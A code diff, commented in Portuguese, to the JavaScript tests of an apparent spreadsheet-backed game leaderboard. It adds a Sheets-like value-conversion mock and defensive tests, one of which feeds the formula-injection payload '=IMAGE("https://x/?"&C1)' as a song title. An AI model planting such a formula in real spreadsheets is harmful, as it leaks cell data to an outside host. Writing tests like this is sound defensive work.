@@ -10,19 +10,32 @@ function newContext() {
   const sheets = {};
   const props = {};
   const cache = {};
+  // Como o Google Planilhas: sem o formato de texto ('@'), "007" vira 7, "true" vira booleano e "=..." vira
+  // fórmula; o apóstrofo no começo força texto (e some na leitura).
   const sheet = (name) => {
     const rows = [];
+    let text = false;
+    const cell = (v) => {
+      if (typeof v !== 'string') return v;
+      if (v.startsWith("'")) return v.slice(1);
+      if (v.startsWith('=')) return '#FÓRMULA';
+      if (text) return v;
+      if (/^[+-]?\d+(\.\d+)?$/.test(v)) return Number(v);
+      if (v.toLowerCase() === 'true') return true;
+      return v;
+    };
     return {
       name,
       rows,
       getLastRow: () => rows.length,
-      appendRow: (row) => rows.push(row.slice()),
+      appendRow: (row) => rows.push(row.map(cell)),
       // Como no Google: uma aba vazia devolve uma linha com uma célula vazia.
       getDataRange: () => ({ getValues: () => (rows.length ? rows.map((r) => r.slice()) : [['']]) }),
       getRange: (row, col, numRows, numCols) => ({
+        setNumberFormat: (format) => { if (format === '@') text = true; },
         setValues: (values) => {
           for (let i = 0; i < numRows; i++) {
-            for (let j = 0; j < numCols; j++) rows[row - 1 + i][col - 1 + j] = values[i][j];
+            for (let j = 0; j < numCols; j++) rows[row - 1 + i][col - 1 + j] = cell(values[i][j]);
           }
         },
       }),
@@ -146,6 +159,23 @@ const tests = {
     assert.deepStrictEqual(c.call({ acao: 'musicas', chave: 'A', busca: '' }).musicas, []);
     const board = c.call({ acao: 'placar', chave: 'A', mapa: 'm1', dificuldade: 'HARD', ordem: 'pontos', sentido: 'desc', busca: '' });
     assert.deepStrictEqual([board.linhas, board.dificuldades], [[], []]);
+  },
+  nomesQueAPlanilhaConverteContinuamUnicos() {
+    const c = newContext();
+    assert.strictEqual(c.call({ acao: 'reservar', nome: '007', chave: 'A' }).ok, true);
+    assert.strictEqual(c.call({ acao: 'reservar', nome: '007', chave: 'B' }).motivo, 'nome_em_uso');
+    c.call({ acao: 'reservar', nome: 'true', chave: 'C' });
+    c.call(play('A'));
+    c.call(play('C'));
+    const board = c.call({ acao: 'placar', chave: 'A', mapa: 'm1', dificuldade: 'HARD', ordem: 'pontos', sentido: 'desc', busca: '00' });
+    assert.deepStrictEqual(board.linhas.map((l) => l.nome), ['007']);
+  },
+  tituloComIgualNaoViraFormula() {
+    const c = newContext();
+    c.call({ acao: 'reservar', nome: 'Ana', chave: 'A' });
+    c.call(play('A', { titulo: '=IMAGE("https://x/?"&C1)', artista: '+44' }));
+    const song = c.call({ acao: 'musicas', chave: 'A', busca: '' }).musicas[0];
+    assert.deepStrictEqual([song.titulo, song.artista], ['=IMAGE("https://x/?"&C1)', '+44']);
   },
   limitePorHora() {
     const c = newContext();
